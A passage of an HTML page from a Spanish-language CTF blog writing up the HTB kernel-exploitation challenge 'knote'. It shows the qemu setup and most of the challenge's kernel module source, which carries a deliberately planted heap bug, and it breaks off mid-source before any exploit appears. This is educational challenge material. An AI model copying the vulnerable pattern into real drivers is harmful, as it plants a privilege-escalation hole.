@@ -1,0 +1,669 @@
+<!doctype html><html lang="es"><head><title>knote | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Explotación de kernel. Explotación del _heap_. `seq_operations`. ret2user"><meta itemprop="description" content="Explotación de kernel. Explotación del _heap_. `seq_operations`. ret2user"><meta name="twitter:card" content="Explotación de kernel. Explotación del _heap_. `seq_operations`. ret2user"><meta name="twitter:description" content="Explotación de kernel. Explotación del _heap_. `seq_operations`. ret2user"><meta property="og:description" content="Explotación de kernel. Explotación del _heap_. `seq_operations`. ret2user"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="knote"><meta property="twitter:title" content="knote"><meta property="og:title" content="knote"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/knote/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/knote/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/knote/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/knote/&amp;text=knote" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/knote/&amp;title=knote" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">knote</h1><p class="mb4 f6 dib tracked">15 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-de-código-fuente">Análisis de código fuente</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#configuración-del-entorno">Configuración del entorno</a></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un sistema de archivos Linux y algunos otros archivos comunes en retos de explotación de kernel:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span>
+.
+├── debug
+│   ├── bzImage
+│   ├── qemu-cmd
+│   └── rootfs.img
+├── knote.c
+└── knote.ko
+
+1 directory, 5 files  
+</code></pre></div><p>Este es <code>debug/qemu-cmd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
+
+<span class="mtk1">timeout --foreground 35 qemu-system-x86_64 \</span>
+<span class="mtk1">  -m 128M \</span>
+<span class="mtk1">  -nographic \</span>
+<span class="mtk1">  -kernel /home/ctf/bzImage \</span>
+<span class="mtk1">  -append </span><span class="mtk4">'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr</span><span class="mtk4">'</span><span class="mtk1"> \</span>  
+<span class="mtk1">  -monitor /dev/null \</span>
+<span class="mtk1">  -initrd /home/ctf/rootfs.img \</span>
+<span class="mtk1">  -no-kvm \</span>
+<span class="mtk1">  -cpu qemu64 \</span>
+<span class="mtk1">  -smp cores=2</span>
+</code></pre></div><p>Básicamente es un comando para ejecutar la imagen del kernel con <code>qemu</code>. Como se puede ver, KASLR está habilitado, pero no hay SMEP, SMAP o KPTI. Todo este conocimiento proviene de <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/"><em>Learning Linux Kernel Exploitation - Part 1</em></a>.</p><h2 id="análisis-de-código-fuente">Análisis de código fuente</h2><p>Esta vez, tenemos el código fuente en C del módulo de kernel (<code>knote.c</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/kernel.h&gt;</span>
+<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/module.h&gt;</span>
+<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/device.h&gt;</span>
+<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/mutex.h&gt;</span>
+<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/fs.h&gt;</span>
+<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/slab.h&gt;</span>
+<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;linux/uaccess.h&gt;</span>
+
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">DEVICE_NAME</span><span class="mtk1"> </span><span class="mtk4">"knote"</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">CLASS_NAME</span><span class="mtk1"> </span><span class="mtk4">"knote"</span>
+
+<span class="mtk8">MODULE_AUTHOR</span><span class="mtk1">(</span><span class="mtk4">"r4j"</span><span class="mtk1">);</span>
+<span class="mtk8">MODULE_DESCRIPTION</span><span class="mtk1">(</span><span class="mtk4">"Secure your secrets in the kernelspace"</span><span class="mtk1">);</span>
+<span class="mtk8">MODULE_LICENSE</span><span class="mtk1">(</span><span class="mtk4">"GPL"</span><span class="mtk1">);</span>
+
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk8">DEFINE_MUTEX</span><span class="mtk1">(knote_ioctl_lock);</span>
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk8">knote_ioctl</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> file </span><span class="mtk5">*</span><span class="mtk9 mtki">file</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">cmd</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">arg</span><span class="mtk1">);</span>
+
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> major;</span>
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> class </span><span class="mtk5">*</span><span class="mtk1">knote_class  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> device </span><span class="mtk5">*</span><span class="mtk1">knote_device </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> file_operations knote_fops </span><span class="mtk5">=</span><span class="mtk1"> {</span>
+<span class="mtk1">    .unlocked_ioctl </span><span class="mtk5">=</span><span class="mtk1"> knote_ioctl</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> knote {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">data;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> len;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">void</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">encrypt_func)(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">void</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">decrypt_func)(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1">);</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> knote_user {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> idx;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> data;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> len;</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">enum</span><span class="mtk1"> knote_ioctl_cmd {</span>
+<span class="mtk1">    KNOTE_CREATE </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1337</span><span class="mtk1">,</span>
+<span class="mtk1">    KNOTE_DELETE </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1338</span><span class="mtk1">,</span>
+<span class="mtk1">    KNOTE_READ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1339</span><span class="mtk1">,</span>
+<span class="mtk1">    KNOTE_ENCRYPT </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">133a</span><span class="mtk1">,</span>
+<span class="mtk1">    KNOTE_DECRYPT </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">133b</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">struct</span><span class="mtk1"> knote </span><span class="mtk5">*</span><span class="mtk1">knotes[</span><span class="mtk6">10</span><span class="mtk1">];</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">knote_encrypt</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">len</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>
+<span class="mtk1">    </span><span class="mtk5">for</span> <span class="mtk1">(i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> len; </span><span class="mtk5">++</span><span class="mtk1">i)</span>
+<span class="mtk1">        data[i] </span><span class="mtk5">^=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">aa</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">knote_decrypt</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">len</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">knote_encrypt</span><span class="mtk1">(data, len);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk8">knote_ioctl</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> file </span><span class="mtk5">*</span><span class="mtk9 mtki">file</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">cmd</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk9 mtki">arg</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">mutex_lock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">struct</span><span class="mtk1"> knote_user ku;</span>
+<span class="mtk1">    </span><span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">copy_from_user</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">ku, (</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)arg, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> knote_user)))</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>
+<span class="mtk1">    </span><span class="mtk5">switch</span> <span class="mtk1">(cmd) {</span>
+<span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> KNOTE_CREATE:</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(ku.len </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> ku.idx </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1">)</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">            </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">data </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">kmalloc</span><span class="mtk1">(ku.len, GFP_KERNEL);</span>
+<span class="mtk1">            knotes[ku.idx] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">kmalloc</span><span class="mtk1">(</span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> knote), GFP_KERNEL);</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(data </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> knotes[ku.idx] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">ENOMEM;</span>
+<span class="mtk1">            }</span>
+
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">data </span><span class="mtk5">=</span><span class="mtk1"> data;</span>
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">len </span><span class="mtk5">=</span><span class="mtk1"> ku.len;</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">copy_from_user</span><span class="mtk1">(knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">data</span><span class="mtk1">, ku.data, ku.len)) {</span>
+<span class="mtk1">                </span><span class="mtk8">kfree</span><span class="mtk1">(knotes[ku.idx]-&gt;data);</span>
+<span class="mtk1">                </span><span class="mtk8">kfree</span><span class="mtk1">(knotes[ku.idx]);</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">encrypt_func </span><span class="mtk5">=</span><span class="mtk1"> knote_encrypt;</span>
+<span class="mtk1">            knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">decrypt_func </span><span class="mtk5">=</span><span class="mtk1"> knote_decrypt;</span>
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> KNOTE_DELETE:</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(ku.idx </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">knotes[ku.idx]) {</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk8">kfree</span><span class="mtk1">(knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">data</span><span class="mtk1">);</span>
+<span class="mtk1">            </span><span class="mtk8">kfree</span><span class="mtk1">(knotes[ku.idx]);</span>
+<span class="mtk1">            knotes[ku.idx] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> KNOTE_READ:</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(ku.idx </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">knotes[ku.idx] </span><span class="mtk5">||</span><span class="mtk1"> ku.len </span><span class="mtk5">&gt;</span><span class="mtk1"> knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk1">len) {</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">copy_to_user</span><span class="mtk1">(ku.data, knotes[ku.idx]</span><span class="mtk5">-&gt;</span><span class="mtk9 mtki">data</span><span class="mtk1">, ku.len)) {</span>
+<span class="mtk1">                </span><span class="mtk8">mutex_unlock</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">knote_ioctl_lock);</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk5">case</span><span class="mtk1"> KNOTE_ENCRYPT:</span>
